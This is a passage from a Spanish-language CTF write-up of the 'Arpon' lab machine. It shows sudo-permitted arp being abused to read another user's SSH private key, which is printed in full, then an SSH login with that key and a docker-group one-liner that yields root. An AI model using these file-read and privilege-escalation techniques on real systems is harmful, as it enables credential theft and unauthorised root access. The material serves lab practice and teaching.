</span></span><span class="line"><span class="cl">&gt;&gt; #!/bin/sh
</span></span><span class="line"><span class="cl">&gt;&gt; cd /var/www/html
</span></span><span class="line"><span class="cl">cd: No existe ninguna direcci√≥n asociada al nombre
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 2 of etherfile /home/foque/script_net_backup.sh !
</span></span><span class="line"><span class="cl">&gt;&gt; tar czf /tmp/backup.tar.gz
</span></span><span class="line"><span class="cl">tar: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 3 of etherfile /home/foque/script_net_backup.sh !
</span></span><span class="line"><span class="cl">&gt;&gt; scp -i /home/foque/.ssh/id_rsa_foque_script /tmp/backup.tar.gz 10.1.1.1@foque:backups/
</span></span><span class="line"><span class="cl">scp: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 4 of etherfile /home/foque/script_net_backup.sh !
</span></span><span class="line"><span class="cl">&gt;&gt; rm /tmp/backup.tar.gz
</span></span><span class="line"><span class="cl">rm: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 5 of etherfile /home/foque/script_net_backup.sh !
</span></span></code></pre></div><p>En el script puedo ver que en la l√≠nea 3 llama a la llave <strong>RSA</strong> con nombre <code>id_rsa_foque_script</code>, configuro de nuevo la variable <strong>LFILE</strong> para leer el contenido.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">calabrote@arpon:~$ LFILE=/home/foque/.ssh/id_rsa_foque_script
</span></span><span class="line"><span class="cl">calabrote@arpon:~$ sudo /usr/sbin/arp -v -f &#34;$LFILE&#34;
</span></span><span class="line"><span class="cl">&gt;&gt; -----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">-----BEGIN: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 1 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
</span></span><span class="line"><span class="cl">arp: format error on line 2 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; NhAAAAAwEAAQAAAgEAkVhG0Fz+OiyVplhjGAXj0H/UjTvKIh0mps2VbpnSgGfJFEQvILdd
</span></span><span class="line"><span class="cl">arp: format error on line 3 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; +9NAQd4rPY393GxElFxms5T5yYGORuTgZZoc8Ch8rJC7GNTLZZIpR8xTiRFuSNwgZlg/4z
</span></span><span class="line"><span class="cl">arp: format error on line 4 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; ah8vWBEh4vHt5D+WtI4d4dLKcdYOCPPi3FNs1EV529u+QkT/BLiCw82LosaQbttM6FAZJh
</span></span><span class="line"><span class="cl">arp: format error on line 5 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; DhtJwxLaA7XbMTfRXMnkpEd4DO5hkJ40GqI51EDeIxrFDccxs2MoiHPJyX2gQP2BxSgLm1
</span></span><span class="line"><span class="cl">arp: format error on line 6 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 2uwX/iLj9ayDoJlRD/qKoJ7wQiJKjsLzKiKbZ/4K24jrNjtm718+hYsrFyKRWhcpIFawzY
</span></span><span class="line"><span class="cl">arp: format error on line 7 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; qgHrEiL5ulqbWGoZHozOFMThItvU433Ox71oaLAvNh6kxZ8n+2dEwWys6zc8jmajwF0k6x
</span></span><span class="line"><span class="cl">arp: format error on line 8 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; XUC5S6sv5V0dQ295CfwRrixfOUFtMDX8uHx2ke3V7T2VSRgK89Pb2VyL/4jPSCQEwFivI6
</span></span><span class="line"><span class="cl">arp: format error on line 9 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; x08GIcKypOa7FBS4Dbgs3F6DQmydD/hnWlT0w+4bep0sPBQf7l0wqC69VhM8Vw8BdoJ1F8
</span></span><span class="line"><span class="cl">arp: format error on line 10 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; oKfPyBj9srWUV0QdDco2lC62cCBFxqthyUAjOHONCL5XAXgUexBuzQ4LCJOIWISijc6LkR
</span></span><span class="line"><span class="cl">arp: format error on line 11 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 7/qAo+D773VY080sB0c7cOvpNd5VUbOKPsJOt3nsn0CHRyGXz4/QhDuBNVgLvbGY+q+6yv
</span></span><span class="line"><span class="cl">arp: format error on line 12 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; kAAAc4V7ULUVe1C1EAAAAHc3NoLXJzYQAAAgEAkVhG0Fz+OiyVplhjGAXj0H/UjTvKIh0m
</span></span><span class="line"><span class="cl">arp: format error on line 13 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; ps2VbpnSgGfJFEQvILdd+9NAQd4rPY393GxElFxms5T5yYGORuTgZZoc8Ch8rJC7GNTLZZ
</span></span><span class="line"><span class="cl">arp: format error on line 14 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; IpR8xTiRFuSNwgZlg/4zah8vWBEh4vHt5D+WtI4d4dLKcdYOCPPi3FNs1EV529u+QkT/BL
</span></span><span class="line"><span class="cl">arp: format error on line 15 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; iCw82LosaQbttM6FAZJhDhtJwxLaA7XbMTfRXMnkpEd4DO5hkJ40GqI51EDeIxrFDccxs2
</span></span><span class="line"><span class="cl">arp: format error on line 16 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; MoiHPJyX2gQP2BxSgLm12uwX/iLj9ayDoJlRD/qKoJ7wQiJKjsLzKiKbZ/4K24jrNjtm71
</span></span><span class="line"><span class="cl">arp: format error on line 17 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 8+hYsrFyKRWhcpIFawzYqgHrEiL5ulqbWGoZHozOFMThItvU433Ox71oaLAvNh6kxZ8n+2
</span></span><span class="line"><span class="cl">arp: format error on line 18 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; dEwWys6zc8jmajwF0k6xXUC5S6sv5V0dQ295CfwRrixfOUFtMDX8uHx2ke3V7T2VSRgK89
</span></span><span class="line"><span class="cl">arp: format error on line 19 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; Pb2VyL/4jPSCQEwFivI6x08GIcKypOa7FBS4Dbgs3F6DQmydD/hnWlT0w+4bep0sPBQf7l
</span></span><span class="line"><span class="cl">arp: format error on line 20 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 0wqC69VhM8Vw8BdoJ1F8oKfPyBj9srWUV0QdDco2lC62cCBFxqthyUAjOHONCL5XAXgUex
</span></span><span class="line"><span class="cl">arp: format error on line 21 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; BuzQ4LCJOIWISijc6LkR7/qAo+D773VY080sB0c7cOvpNd5VUbOKPsJOt3nsn0CHRyGXz4
</span></span><span class="line"><span class="cl">arp: format error on line 22 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; /QhDuBNVgLvbGY+q+6yvkAAAADAQABAAACAAPGWlcFBi5e+G0cYxoah/dXfAejALXB7JtV
</span></span><span class="line"><span class="cl">arp: format error on line 23 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; tHUzinCtTQHn1Ib3ogVWCjpgE8eZ8GF5zUi29Iz5/3D3gz2jktdNx9D8lO4rJe9dzI0W3S
</span></span><span class="line"><span class="cl">arp: format error on line 24 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; k82KYzJIMd6wEjSFesoAVp0UG2BhFFcRJSz0NQqnl9mCqOCn63AoMLN7vP5ihrulsoxpqC
</span></span><span class="line"><span class="cl">arp: format error on line 25 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 30CX52rTP+CqLYgnAnSnPsejOW4ggxaUPkTyNWZBZ3jgr7SMSMTfONNFldahkImDtPobRx
</span></span><span class="line"><span class="cl">arp: format error on line 26 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; Xx+bmS8fW7PN/ZhfLr3YAkIPKzFlmvpI5udtyhjTHEnFmsTXVPn25iF0qBL81xWUfkf9zK
</span></span><span class="line"><span class="cl">arp: format error on line 27 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; GfFzmuUm0AeeXITA9pFo3hJXsmJKKx3pj1bU5QDbiiHWjv8nWdbX6FJ+Yhnq7yes3GMGp2
</span></span><span class="line"><span class="cl">arp: format error on line 28 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; qXjwIkHxKVV7z5E0FZS0D2+Wcm+vVFknZLAAN90ifbfx8RiYGGBWHIvnpeFAj6zpvgYaf0
</span></span><span class="line"><span class="cl">arp: format error on line 29 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; l6WwWHeAA/s2jaVwHgMK7rLsIBdQw2MMSDsfhvzQUj2F69VOGge9GQCgPvS3VFb7ADFZwk
</span></span><span class="line"><span class="cl">arp: format error on line 30 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; G4syMyNN3VFuSnPuByh9x9THPeAbioOav4KFl/7bOm192NcXgtem3jmqb7kKBg78A8qxqp
</span></span><span class="line"><span class="cl">arp: format error on line 31 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; pIUhG2IaQDgXIBB3lcLF1/SZuRHDHHBw3oDP1FoNR391dcLWaBsqU1FvGGMoDtwlhcxaby
</span></span><span class="line"><span class="cl">arp: format error on line 32 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; xtUd6aR9nLNIpfNrqVAAABAD/oEehnXYDYwoiCbD8DV17/Ik2c0AZcmM60Mf5y7xBJU3Ij
</span></span><span class="line"><span class="cl">arp: format error on line 33 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; WpDUXQ8ckGuDPfGJbykrSLzOK+fuGVlyIEzYwjmPR0aVRa6OkWUkKkxuLbZlKaQ2pvnQnm
</span></span><span class="line"><span class="cl">arp: format error on line 34 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; cSWttPF4xd3aZT5l/YYRX71SgnMm73AUXQlf1oWEkkwYbHDtNU1xY1JdHlJ6hYtgloI38h
</span></span><span class="line"><span class="cl">arp: format error on line 35 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; EW18AwS53wSeB/3rkpxeyBrseDYeyH6ryHu8zkfsUaAi5uvaN67ZVpB+KZ4cn803kFew1Z
</span></span><span class="line"><span class="cl">arp: format error on line 36 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; jJkU12ctaO0e8WZGhhnvLdWOOBC6TDBizshU6cK/cwDoP7bx4GaY81vmaOLtJaImtcbz8E
</span></span><span class="line"><span class="cl">arp: format error on line 37 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 4PpurVzZiXCFA4kAAAEBAMTfHA3jndrHkSnWKmRkVQR+5ih5+s+8gFcE5sUuoyNxN3/Imr
</span></span><span class="line"><span class="cl">arp: format error on line 38 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; vMgU09uFUqFC5LHv8jww977i8E18GAch6viepqLCNTOPOCI6TG9UPqUUiaU0/17Xd8fvvb
</span></span><span class="line"><span class="cl">arp: format error on line 39 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; kV62c0ObZs6Tf171BjawAmxryr5mngXCNFxtJVkx9WPoqzsZlqV/5QAZzWbi/eAYTbpEni
</span></span><span class="line"><span class="cl">arp: format error on line 40 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 3krmg7fKFURt1A7EQPeWE4zQP6z88KiqWndgS4KtS/w/K188CdgXghocBDiI2aQ667RHpx
</span></span><span class="line"><span class="cl">arp: format error on line 41 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; qiRI5wsf4tGkACn6ZmjInrouQgW6JPb/f/K/lS/EQQ8i2SYffgD0WBjWMkMTdiNfiguJXq
</span></span><span class="line"><span class="cl">arp: format error on line 42 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; kJLMJipbI8tf8AAAEBALz/bTGz59Y+JVgdbVJbHpcGSoTvtXVTgQYgaiZbGLhkAw707mZV
</span></span><span class="line"><span class="cl">arp: format error on line 43 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 3udqk/mrvuFfl7x9HgIWDbuv2rRYbcm7O9eMKwq3/a1ZXJD2NbYp3jJk12lNhm+yerrxSx
</span></span><span class="line"><span class="cl">arp: format error on line 44 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; bvCvypzdfn1arBkO3MN9Ygt5rtq/MEyDBjhrr3++TXgCfsckuHPqM3aYoEgz+cpk5G09Uy
</span></span><span class="line"><span class="cl">arp: format error on line 45 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 5l1Ldqb3KNl9RE4liPI4+TXfCLIgmqSwiX89D4TxisapDysk1QYwi54ympRsUdXlVnP0Jw
</span></span><span class="line"><span class="cl">arp: format error on line 46 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 2dtQG9d5tfhrp/OjkDKwVoaVs0NkU66ASstZSjCpLQsFmsru4ULI/5MIphqnS6351nRZAb
</span></span><span class="line"><span class="cl">arp: format error on line 47 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; 8h0k8uVYLwcAAAADa2V5
</span></span><span class="line"><span class="cl">arp: format error on line 48 of etherfile /home/foque/.ssh/id_rsa_foque_script !
</span></span><span class="line"><span class="cl">&gt;&gt; -----END OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">-----END: `Host&#39; desconocido
</span></span></code></pre></div><p>Creo el archivo <code>foque.txt</code> con el contenido del archivo <code>id_rsa_foque_script</code> para limpiarlo con <strong>grep</strong> y <strong>tr</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">cat foque.txt | grep -v -e arp -e Host | tr -d &#39;&gt;&gt;&#39;
</span></span></code></pre></div><p>Una vez tengo la llave <strong>RSA</strong> l√≠mpia, le doy permisos con <strong>chmod</strong> y me conecto al sistema como usuario <strong>foque</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ chmod 600 id_rsa_foque
</span></span><span class="line"><span class="cl">‚ùØ ssh foque@172.0.100.28 -i id_rsa_foque
</span></span><span class="line"><span class="cl">Linux arpon 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software;
</span></span><span class="line"><span class="cl">the exact distribution terms for each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span><span class="line"><span class="cl">$ bash -i 
</span></span><span class="line"><span class="cl">foque@arpon:~$ 
</span></span></code></pre></div><p>Con <strong>id</strong> veo que <strong>foque</strong> es miembro del grupo <code>docker</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">foque@arpon:~$ id
</span></span><span class="line"><span class="cl">uid=1002(foque) gid=1002(foque) grupos=1002(foque),996(docker)
</span></span></code></pre></div><p>En este <a href="https://www.reddit.com/r/oscp/comments/les434/linux_privilege_escalation_docker_group/">enlace</a> me proporciona informaci√≥n para elevar privilegios.</p>
<p><img src="/../machines/nyx/arpon/dockerprivesc.webp" alt="dockerprivesc"></p>
<p>Al introducir el <strong>oneliner</strong> me devuelve una terminal de root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">foque@arpon:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</span></span><span class="line"><span class="cl"># bash -i
</span></span><span class="line"><span class="cl">root@303a71a3f53f:/# id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
</span></span><span class="line"><span class="cl">root@303a71a3f53f:/#
</span></span></code></pre></div><p>Y aqu√≠ termina la m√°quina Arpon.</p>
<p>Saludos!</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2025 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
